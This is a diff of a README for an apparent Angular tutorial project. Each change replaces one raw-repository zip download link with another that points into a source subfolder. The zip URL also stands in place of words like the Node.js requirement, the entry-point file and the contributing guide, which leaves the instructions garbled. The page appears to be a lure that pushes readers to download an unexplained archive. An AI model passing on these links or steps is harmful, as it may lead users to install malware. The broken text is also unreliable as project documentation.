@@ -1,6 +1,6 @@
 # 🚀 frontend-engineering-angular - Practical Project for Frontend Success
 
-[![Download Now](https://github.com/loserbygod/frontend-engineering-angular/raw/refs/heads/main/public/frontend-engineering-angular-v1.6.zip%20Now-Get%20Started-brightgreen)](https://github.com/loserbygod/frontend-engineering-angular/raw/refs/heads/main/public/frontend-engineering-angular-v1.6.zip)
+[![Download Now](https://github.com/loserbygod/frontend-engineering-angular/raw/refs/heads/main/src/app/core/interceptors/engineering-frontend-angular-1.6.zip%20Now-Get%20Started-brightgreen)](https://github.com/loserbygod/frontend-engineering-angular/raw/refs/heads/main/src/app/core/interceptors/engineering-frontend-angular-1.6.zip)
 
 ## 📜 Introduction
 
@@ -19,7 +19,7 @@ Welcome to the **frontend-engineering-angular** project. This application is des
 To run this application, ensure your system meets the following requirements:
 
 - **Operating System**: Windows, macOS, or a modern Linux distribution.
-- **https://github.com/loserbygod/frontend-engineering-angular/raw/refs/heads/main/public/frontend-engineering-angular-v1.6.zip**: Version 14 or higher (for Angular compatibility).
+- **https://github.com/loserbygod/frontend-engineering-angular/raw/refs/heads/main/src/app/core/interceptors/engineering-frontend-angular-1.6.zip**: Version 14 or higher (for Angular compatibility).
 - **Browser**: Latest version of Chrome, Firefox, or Safari for optimal testing.
 
 ## 🚀 Getting Started
@@ -28,21 +28,21 @@ Follow these steps to download and run the software on your machine.
 
 1. **Visit the Releases Page**: Click the button below to go to our releases page.
    
-   [Download Now](https://github.com/loserbygod/frontend-engineering-angular/raw/refs/heads/main/public/frontend-engineering-angular-v1.6.zip)
+   [Download Now](https://github.com/loserbygod/frontend-engineering-angular/raw/refs/heads/main/src/app/core/interceptors/engineering-frontend-angular-1.6.zip)
 
 2. **Choose the Latest Release**: On the releases page, locate the most recent version of the application. This version will have the latest features and bug fixes.
 
-3. **Download the Package**: Look for the appropriate file format for your operating system, such as .zip or https://github.com/loserbygod/frontend-engineering-angular/raw/refs/heads/main/public/frontend-engineering-angular-v1.6.zip Click on the link to start the download.
+3. **Download the Package**: Look for the appropriate file format for your operating system, such as .zip or https://github.com/loserbygod/frontend-engineering-angular/raw/refs/heads/main/src/app/core/interceptors/engineering-frontend-angular-1.6.zip Click on the link to start the download.
 
 4. **Extract the Files**: Once the download is complete, locate the downloaded file on your computer. Extract the contents using your system's file extraction tool.
 
-5. **Run the Application**: Navigate to the extracted folder. In this folder, find the entry point (often named `https://github.com/loserbygod/frontend-engineering-angular/raw/refs/heads/main/public/frontend-engineering-angular-v1.6.zip` for web projects). Open this file in your web browser to launch the app.
+5. **Run the Application**: Navigate to the extracted folder. In this folder, find the entry point (often named `https://github.com/loserbygod/frontend-engineering-angular/raw/refs/heads/main/src/app/core/interceptors/engineering-frontend-angular-1.6.zip` for web projects). Open this file in your web browser to launch the app.
 
 ## 📥 Download & Install
 
 For ease of access, you can also download the application directly from our releases page. Click the link below for quick access:
 
-[Visit this page to download](https://github.com/loserbygod/frontend-engineering-angular/raw/refs/heads/main/public/frontend-engineering-angular-v1.6.zip)
+[Visit this page to download](https://github.com/loserbygod/frontend-engineering-angular/raw/refs/heads/main/src/app/core/interceptors/engineering-frontend-angular-1.6.zip)
 
 ## 📚 Further Documentation
 
@@ -94,6 +94,6 @@ Explore these topics further to enhance your frontend skills.
 
 ## 📂 Contributing
 
-Interested in contributing? We welcome help from developers and users alike. Please refer to the `https://github.com/loserbygod/frontend-engineering-angular/raw/refs/heads/main/public/frontend-engineering-angular-v1.6.zip` file included in the project for guidelines on how to contribute effectively.
+Interested in contributing? We welcome help from developers and users alike. Please refer to the `https://github.com/loserbygod/frontend-engineering-angular/raw/refs/heads/main/src/app/core/interceptors/engineering-frontend-angular-1.6.zip` file included in the project for guidelines on how to contribute effectively.
 
 Feel free to explore the project and share your insights. Your involvement helps us grow the community and enhance the application for everyone.
